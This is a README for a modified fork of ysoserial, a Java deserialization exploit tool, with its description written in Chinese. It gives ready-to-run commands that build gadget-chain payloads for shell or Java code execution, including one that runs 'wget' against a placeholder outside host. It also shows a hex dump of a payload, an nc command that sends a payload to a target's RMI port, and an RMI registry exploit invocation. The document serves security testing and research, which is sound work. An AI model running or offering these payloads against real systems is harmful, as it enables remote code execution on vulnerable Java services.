
# ysoserial-5am3

> forked from frohoff/ysoserial



## Description

基于原版的一个魔改版。

- [+] 在原版生成命令执行基础上，使其支持生成代码执行Payload
- [+] Add JRMPClient2 (https://xz.aliyun.com/t/2479#toc-1)

## Usage

```bash
# 1.调用模块
# java -cp ./ysoserial-5am3.jar <模块名> <所需参数> 
java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8579 URLDNS 

# 2.采用内置poc，生成反序列化payload

# 2.1.默认
# java -jar ./ysoserial-5am3.jar <POC名称> <所需参数> 
# 默认生成为二进制字节
java -jar ./ysoserial-5am3.jar JRMPClient2 10.0.0.1:8119

# 2.2.payload中含有命令执行等参数
# 2.2.1 执行shell命令

java -jar ysoserial.jar CommonsCollections1 "wget http://eval.com"

# 2.2.2 执行java代码

java -jar ysoserial.jar CommonsCollections1 'code:System.out.println("Hello Hack!");'
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Download & Building 

Requires Java 1.7+ and Maven 3.x+

```bash

git clone https://github.com/5am3/ysoserial.git
cd ysoserial
mvn clean package -DskipTests
java -jar ./target/ysoserial-0.0.6-SNAPSHOT-all.jar
```
